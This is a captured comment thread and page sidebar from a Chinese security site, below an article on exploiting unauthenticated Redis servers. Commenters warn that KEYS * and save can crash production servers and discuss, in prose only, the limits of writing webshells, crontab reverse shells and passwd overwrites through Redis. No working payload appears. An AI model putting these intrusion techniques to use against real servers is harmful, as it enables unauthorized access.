           <a onclick="return addComment.moveForm( 'comment-230606','230606', 'respond','148758' ) " href="?replytocom=230606#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">2楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>KEYS *这种语句也敢随便执行的吗<br />
不要误人子弟好吧,生产环境上用这句就炸了</p>
<div class="comment-tools">
<div class="vote" id="vote-230606"><span id="acv_stat_230606"></span><a class="ilike_icon"  id="vote4-230606" href="javascript:acv_vote(230606,1);">亮了</a>(<span id="cos_support-230606">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230606" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230606" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230606" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230606" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230606" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-bshadow even depth-2" id="li-comment-230623">
    <div id="comment-230623">
        <div class="photo"> <a href="http://www.freebuf.com/author/bshadow">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/bshadow" target="_blank">bshadow&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230623','230623', 'respond','148758' ) " href="?replytocom=230623#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ 老阿訇  请问KEYS*这语句怎么了，我还真用过，没发生啥啊&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-230623"><span id="acv_stat_230623"></span><a class="ilike_icon"  id="vote4-230623" href="javascript:acv_vote(230623,1);">亮了</a>(<span id="cos_support-230623">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230623" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230623" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230623" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230623" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230623" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-3" id="li-comment-230628">
    <div id="comment-230628">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic2.png">     </div>
    <div class="tit"> 
	    <span class="name"> 老阿訇 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-230628','230623', 'respond','148758' )" href="?replytocom=230628#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ bshadow    线上环境是应该禁止使用keys *命令的<br />
几百万条几千万条数据吐到命令行里面会把服务器CPU跑满 运气不好的话服务就直接挂了<br />
之前公司就出过类似的事情  血的教训</p>
<div class="comment-tools">
<div class="vote" id="vote-230628"><span id="acv_stat_230628"></span><a class="ilike_icon"  id="vote4-230628" href="javascript:acv_vote(230628,1);">亮了</a>(<span id="cos_support-230628">2</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230628" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230628" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230628" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230628" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230628" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-cgf99 even depth-3" id="li-comment-230694">
    <div id="comment-230694">
        <div class="photo"> <a href="http://www.freebuf.com/author/cgf99">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/cgf99" target="_blank">cgf99&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(2级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-26</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-230694','230623', 'respond','148758' )" href="?replytocom=230694#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ 老阿訇  对，这个真是这样的。</p>
<div class="comment-tools">
<div class="vote" id="vote-230694"><span id="acv_stat_230694"></span><a class="ilike_icon"  id="vote4-230694" href="javascript:acv_vote(230694,1);">亮了</a>(<span id="cos_support-230694">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230694" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230694" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230694" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230694" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230694" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-230615">
    <div id="comment-230615">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic4.png">     </div>
    <div class="tit"> 
	    <span class="name"> Mark </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230615','230615', 'respond','148758' ) " href="?replytocom=230615#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">3楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>围观大佬</p>
<div class="comment-tools">
<div class="vote" id="vote-230615"><span id="acv_stat_230615"></span><a class="ilike_icon"  id="vote4-230615" href="javascript:acv_vote(230615,1);">亮了</a>(<span id="cos_support-230615">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230615" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230615" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230615" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230615" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230615" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment even thread-odd thread-alt depth-1" id="li-comment-230647">
    <div id="comment-230647">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic5.png">     </div>
    <div class="tit"> 
	    <span class="name"> M0e </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230647','230647', 'respond','148758' ) " href="?replytocom=230647#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">4楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>作者有在实战环境中尝试过吗？redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的</p>
<div class="comment-tools">
<div class="vote" id="vote-230647"><span id="acv_stat_230647"></span><a class="ilike_icon"  id="vote4-230647" href="javascript:acv_vote(230647,1);">亮了</a>(<span id="cos_support-230647">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230647" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230647" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230647" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230647" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230647" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment odd alt thread-even depth-1" id="li-comment-230692">
    <div id="comment-230692">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic12.png">     </div>
    <div class="tit"> 
	    <span class="name"> 窃格瓦拉 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-25</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230692','230692', 'respond','148758' ) " href="?replytocom=230692#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">5楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>在生尝环境直接save怕是要爆炸</p>
<div class="comment-tools">
<div class="vote" id="vote-230692"><span id="acv_stat_230692"></span><a class="ilike_icon"  id="vote4-230692" href="javascript:acv_vote(230692,1);">亮了</a>(<span id="cos_support-230692">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230692" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230692" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230692" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230692" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230692" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-catcher_ even thread-odd thread-alt depth-1" id="li-comment-230696">
    <div id="comment-230696">
        <div class="photo"> <a href="http://www.freebuf.com/author/catcher_">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/catcher_" target="_blank">catcher_&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-26</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230696','230696', 'respond','148758' ) " href="?replytocom=230696#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">6楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>都是老套路，恢复passwd这个根本不可能，redis写入的时候就会覆盖passwd，怎么恢复passwd&#8230;.，免ssh登陆需要开启免登录，crontab反弹debain,ubantu都不行，他们对计划任务的格式很严格&#8230;&#8230;</p>
<div class="comment-tools">
<div class="vote" id="vote-230696"><span id="acv_stat_230696"></span><a class="ilike_icon"  id="vote4-230696" href="javascript:acv_vote(230696,1);">亮了</a>(<span id="cos_support-230696">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230696" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230696" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230696" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230696" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230696" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-2" id="li-comment-230699">
    <div id="comment-230699">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic2.png">     </div>
    <div class="tit"> 
	    <span class="name"> 3月半 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-26</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230699','230699', 'respond','148758' ) " href="?replytocom=230699#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ catcher_    不留下点新套路就走？</p>
<div class="comment-tools">
<div class="vote" id="vote-230699"><span id="acv_stat_230699"></span><a class="ilike_icon"  id="vote4-230699" href="javascript:acv_vote(230699,1);">亮了</a>(<span id="cos_support-230699">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230699" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230699" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230699" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230699" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230699" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
<li class="comment byuser comment-author-12 even thread-even depth-1" id="li-comment-230701">
    <div id="comment-230701">
        <div class="photo"> <a href="http://www.freebuf.com/author/东12">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/东12" target="_blank">东12&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(1级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2017-09-26</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-230701','230701', 'respond','148758' ) " href="?replytocom=230701#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">7楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p> <img src='http://image.3001.net/images/index/smilies/icon_mrgreen.gif' alt=':mrgreen:' class='wp-smiley' />   <img src='http://image.3001.net/images/index/smilies/icon_mrgreen.gif' alt=':mrgreen:' class='wp-smiley' />   <img src='http://image.3001.net/images/index/smilies/icon_mrgreen.gif' alt=':mrgreen:' class='wp-smiley' />  围观大佬，目测要火</p>
<div class="comment-tools">
<div class="vote" id="vote-230701"><span id="acv_stat_230701"></span><a class="ilike_icon"  id="vote4-230701" href="javascript:acv_vote(230701,1);">亮了</a>(<span id="cos_support-230701">0</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="230701" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="230701" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="230701" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="230701" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="230701" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
      </ul>
      <div class="commentnav page01" style="padding-top:10px; text-align: center;">
               </div>
	  
<script src="http://www.freebuf.com/buf/themes/freebuf/js/ajaxfileupload.js" type="text/javascript"></script>
<div id="respond" class="comment-box">
<input type="file" id="uploadUnit" name="upfile" class="hidden" value="">
    <form action="http://www.freebuf.com/wp-comments-post.php" method="post" id="commentform">
        <div id="comment-author-info">
	    <div class="login-other">
		  <div class="login_button login_icon_sina" title="使用新浪微博登陆" onclick="login_button_click('sina')"></div>
          <div class="login_button login_icon_qq" title="使用腾讯QQ登陆" onclick="login_button_click('qq')"></div></div>
        <div class="login-input">
	    <p><label for="author">昵称</label>
		          <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p><span>必须</span><span>您当前尚未登录。<a  class="simplemodal-login" href="http://www.freebuf.com/oauth" title="登陆">登陆？</a><a  href="https://account.tophant.com/register.html" target="_blank">注册</a></span></div>
		<div class="login-input">
		  <p><label for="email">邮箱</label><input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required /></p>
		<span>必须（保密）</span>
		</div>
    </div>

        <div id="test" class="post-area">
      <div class="holiday"></div>
	    <div class="comment-editor">
			<a id="comment-smiley" href="javascript:;">表情</a><a href="javascript:;" id="imageThumb">插图</a>
	    </div>
        <div id="smileys" >
           <a title="mrgreen" href="javascript:grin(':mrgreen:')"><img src="http://image.3001.net/images/index/smilies/icon_mrgreen.gif" /></a><a title="razz" href="javascript:grin(':razz:')"><img src="http://image.3001.net/images/index/smilies/icon_razz.gif" /></a><a title="sad" href="javascript:grin(':sad:')"><img src="http://image.3001.net/images/index/smilies/icon_sad.gif" /></a><a title="smile" href="javascript:grin(':smile:')"><img src="http://image.3001.net/images/index/smilies/icon_smile.gif" /></a><a title="oops" href="javascript:grin(':oops:')"><img src="http://image.3001.net/images/index/smilies/icon_redface.gif" /></a><a title="grin" href="javascript:grin(':grin:')"><img src="http://image.3001.net/images/index/smilies/icon_biggrin.gif" /></a><a title="eek" href="javascript:grin(':eek:')"><img src="http://image.3001.net/images/index/smilies/icon_surprised.gif" /></a><a title="???" href="javascript:grin(':???:')"><img src="http://image.3001.net/images/index/smilies/icon_confused.gif" /></a><a title="cool" href="javascript:grin(':cool:')"><img src="http://image.3001.net/images/index/smilies/icon_cool.gif" /></a><a title="lol" href="javascript:grin(':lol:')"><img src="http://image.3001.net/images/index/smilies/icon_lol.gif" /></a><a title="mad" href="javascript:grin(':mad:')"><img src="http://image.3001.net/images/index/smilies/icon_mad.gif" /></a><a title="twisted" href="javascript:grin(':twisted:')"><img src="http://image.3001.net/images/index/smilies/icon_twisted.gif" /></a><a title="roll" href="javascript:grin(':roll:')"><img src="http://image.3001.net/images/index/smilies/icon_rolleyes.gif" /></a><a title="wink" href="javascript:grin(':wink:')"><img src="http://image.3001.net/images/index/smilies/icon_wink.gif" /></a><a title="idea" href="javascript:grin(':idea:')"><img src="http://image.3001.net/images/index/smilies/icon_idea.gif" /></a><a title="arrow" href="javascript:grin(':arrow:')"><img src="http://image.3001.net/images/index/smilies/icon_arrow.gif" /></a><a title="neutral" href="javascript:grin(':neutral:')"><img src="http://image.3001.net/images/index/smilies/icon_neutral.gif" /></a><a title="cry" href="javascript:grin(':cry:')"><img src="http://image.3001.net/images/index/smilies/icon_cry.gif" /></a><a title="?" href="javascript:grin(':?:')"><img src="http://image.3001.net/images/index/smilies/icon_question.gif" /></a><a title="evil" href="javascript:grin(':evil:')"><img src="http://image.3001.net/images/index/smilies/icon_evil.gif" /></a><a title="shock" href="javascript:grin(':shock:')"><img src="http://image.3001.net/images/index/smilies/icon_eek.gif" /></a><a title="!" href="javascript:grin(':!:')"><img src="http://image.3001.net/images/index/smilies/icon_exclaim.gif" /></a>        </div>
         <textarea name="comment" id="comment" cols="100%" rows="7" tabindex="4" style="overflow-x:hidden; overflow-y:hidden; border:0; width:100%;" onkeydown="if(event.ctrlKey&amp;&amp;event.keyCode==13){document.getElementById('submit').click();return false};"></textarea>
    </div>
      <div class="subcon but">
      <input class="btn btn-success" type="submit" name="submit" id="submit" tabindex="5" value="提交评论(Ctrl+Enter)" />
      <a rel="nofollow" class="btn btn-default" id="cancel-comment-reply-link" href="javascript:;">取消</a>
      <div class="checkbox"><input type='hidden' name='comment_post_ID' value='148758' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<label for="comment_mail_notify" class="comment_mail"><input type="checkbox" name="comment_mail_notify" id="comment_mail_notify" value="comment_mail_notify" checked="checked"/>有人回复时邮件通知我</label></div>
      </div>
    <input name="Token" id="Token" type="hidden" value="vkgtnp" />
  </form>
  </div>
</div>	  
<div class="commentshow">
<div class="comments-loading">Loading...</div>
</div>
<script language="javascript">
jQuery(document).ready(function($){ //Begin jQuery
    $('.reply').click(function() {
    var atid = '"#' + $(this).parent().attr("id") + '"';
    var atname = $(this).parent().find('span:first').text();
    $("#comment").val("@" + atname + " ").focus();
});
    $('.cancel-comment-reply a').click(function() { //点击取消回复评论清空评论框的内容
    $("#comment").val('');
});
}) 

jQuery(document).ready(function($) {
    $body = (window.opera) ? (document.compatMode == "CSS1Compat" ? $('html') : $('body')) : $('html,body');//commentnav ajax
    $(document).on('click', '.commentnav a', function(e) {
        e.preventDefault();
        $.ajax({
            type: "GET",
            url: $(this).attr('href'),
            beforeSend: function() {
                $('.commentnav').remove();
                $('.comment-list').remove();
                $('.comments-loading').slideDown();
            },
            dataType: "html",
            success: function(out) {
                result = $(out).find('.comment-list');
                nextlink = $(out).find('.commentnav');
                $('.comments-loading').slideUp(550);
                $('.comments-loading').after(result.fadeIn(800));
                $(".comment-list img").each(function(){
                  var url = $(this).attr("data-original");
                  $(this).attr("src",url);
                })
            }
        });
    });    
});
</script>            </div>
                    <div class="col-md-3 visible-md-block visible-lg-block">
                <div class="panel panel-default">
                    <div class="author-top">
                         <div class="author-wrap">
                            <div class="author-header"><img src="http://image.3001.net/images/20170922/1506075605316.jpg!video" width="0" height="0" alt="yangyangwithgnu" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo" />                            </div>
                            <p class="name"><a href="http://www.freebuf.com/author/yangyangwithgnu" title="由 yangyangwithgnu 发布" rel="author">yangyangwithgnu</a><span></span></p>
                            <p class="signature">任何事情都有无穷乐趣！ yangyangwithgnu.github.io</p>
                            <p class="art-com clearfix">
                                <span class="aut-article">
                                    <a href="/author/yangyangwithgnu"target="_blank">
                                        <i>1</i>
                                        <i>文章数</i>
                                    </a>
                                </span>
                                <span class="aut-comment">
                                    <a href="/author/yangyangwithgnu?comment=1" target="_blank">
                                        <i>0</i>
                                        <i>评论数</i>
                                    </a>
                                </span>
                            </p>
                        </div>
                    </div>
                    <div class="author-bottom">
                        <div class="author-wrap">
                            <h3 class="last-title">最近文章</h3>
                            <div class="last-item-wrap">
                                                                        <div class="last-item">
                                            <a href="http://www.freebuf.com/vuls/148758.html" target="_blank"><span class="point"></span>不请自来 | Redis 未授权访问漏洞深度利用</a>
                                            <p class="last-time">2017.09.25</p>
                                        </div>
                                                                </div>
                        </div>

                        <div class="more-wrap">
                            <a href="http://www.freebuf.com/author/yangyangwithgnu" target="_blank" class="btn-new">浏览更多</a>
                        </div>
                    </div>
                </div>
                                <div class="panel panel-default">
                    <div class="read visible-md-block visible-lg-block">
                        <div class="main-tit02">
                            <h3>相关阅读</h3>
                        </div>
                        <ul>
  <li><a href="http://www.freebuf.com/articles/terminal/86130.html" target="_blank">Redis事件综合分析</a></li>
  
  <li><a href="http://www.freebuf.com/articles/system/91527.html" target="_blank">Libc堆管理机制及漏洞利用技术 (一）</a></li>
  
  <li><a href="http://www.freebuf.com/vuls/85833.html" target="_blank">Redis漏洞攻击植入木马逆向分析</a></li>
  
  <li><a href="http://www.freebuf.com/sectool/117491.html" target="_blank">Metasploitable 2系列教程：漏洞利用之Unreal IRCd 3.2.8.1</a></li>
  
  <li><a href="http://www.freebuf.com/vuls/85021.html" target="_blank">Redis未授权访问导致可远程获得服务器权限</a></li>
  </ul>                    </div>
                </div>
                <!--<div class="ad-wrap"><a href="http://www.ijiami.cn/?freebuf.com" target="_blank"><img width="100%" src="http://image.3001.net/images/20141201/14174039186901.jpg"></a></div>-->
                <div class="panel panel-default rec-spe">
                    <div class="main-tit03 colour-blue">
                        <h3>特别推荐</h3>
                    </div>
                                                    <div class="rec-img"><a href="http://www.freebuf.com/ad?id=3" target="_blank"><img
                                            src="http://image.3001.net/2017/05/14a10c5c919d154dddbee79e3a944143-220x150.png" width="220"></a></div>
                                                </div>
                <div id="mar-right">
                    <!--<div class="read visible-lg-block">
        <div class="main-tit04">
          <h3>商城新品</h3>
        </div>
        <div id="slider" class="nivoSlider">  </div>
      </div>-->
                    <div class="panel panel-default code"><img src="http://image.3001.net/images/new/code.jpg" width="192"
                                                               height="192">
                        <p>关注我们 分享每日精选文章</p>
                    </div>
                </div>
            </div>
                </div>
                    <div class="row marvellous visible-lg-block">
                <h3>不容错过</h3>
                <ul>
                                                <li><a href="http://www.freebuf.com/news/143151.html" rel="bookmark"
                                   title="Buf早餐铺 | 阻击WannaCry的“英雄”被FBI逮捕；赛门铁克即将卖掉SSL业务；美国将确立IoT安全标准法案；">Buf早餐铺 | 阻击WannaCry的“英雄”被FBI逮捕；赛门铁克即将卖掉SSL业务；美国将确立IoT安全标准法案；</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/angelay" title="由 AngelaY 发布" rel="author">AngelaY</a></span>
                                                                        <span class="time">2017-08-04</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/114391.html" rel="bookmark"
                                   title="USB Kill v2.0，一个可以瞬间烧毁电脑或平板的“U盘”">USB Kill v2.0，一个可以瞬间烧毁电脑或平板的“U盘”</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/alpha_h4ck" title="由 Alpha_h4ck 发布" rel="author">Alpha_h4ck</a></span>
                                                                        <span class="time">2016-09-13</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/fevents/123889.html" rel="bookmark"
                                   title="FreeBuf 2017互联网安全创新大会视频&#038;图文直播(已结束)">FreeBuf 2017互联网安全创新大会视频&#038;图文直播(已结束)</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/kuma" title="由 kuma 发布" rel="author">kuma</a></span>
                                                                        <span class="time">2016-12-29</span></p>
                            </li>
                                                    <li><a href="http://www.freebuf.com/news/topnews/62428.html" rel="bookmark"
                                   title="FreeBuf公开课：轻松的方式科普什么是DDoS（分布式拒绝攻击）">FreeBuf公开课：轻松的方式科普什么是DDoS（分布式拒绝攻击）</a>
                                <p>                                        <span class="name"><a href="http://www.freebuf.com/author/fb%e8%a7%86%e9%a2%91" title="由 FB视频 发布" rel="author">FB视频</a></span>
                                                                        <span class="time">2015-03-31</span></p>
                            </li>
                                                            </ul>
            </div>
            </div>
</div>
<script type="text/javascript">
  $(window).load(function() {
    $('#slider').nivoSlider();
  });
  $('#contenttxt img').removeAttr('height');
  $('#contenttxt img').wrap(function(){
    if(!$(this).parent().attr('href')){
      var imgurl = $(this).attr('data-original');
      if(imgurl.substr(-6)=='!small'){
        imgurl = imgurl.substring(0,imgurl.length-6);
      }
      return '<a href="' + imgurl + '" class="highslide-image" onclick="return hs.expand(this);" target="_blank"></a>';
    }
  })
</script>
<script src="http://www.freebuf.com/buf/themes/freebuf/js/comments-ajax.js" type="text/javascript"></script>
<script type="text/javascript" src="http://static.3001.net/js/focus/jquery.nivo.slider.pack.js"></script>
<!----------footer---------->
<div class="footer">
  <div class="container">
    <div class="footer-list ">
      <h3>FREEBUF</h3>
      <ul>
        <li><a href="http://www.freebuf.com/dis">免责声明</a></li>
        <li><a href="http://www.freebuf.com/news/others/864.html">关于我们</a></li>
        <li><a href="http://www.freebuf.com/jobs/40386.html">加入我们</a></li>
      </ul>
    </div>
    <div class="footer-list ">
      <h3>广告及服务</h3>
      <ul>
        <li><a target="_blank" href="mailto:root@freebuf.com">寻求报道</a></li>
        <li><a href="http://www.freebuf.com/advertise">广告合作</a></li>
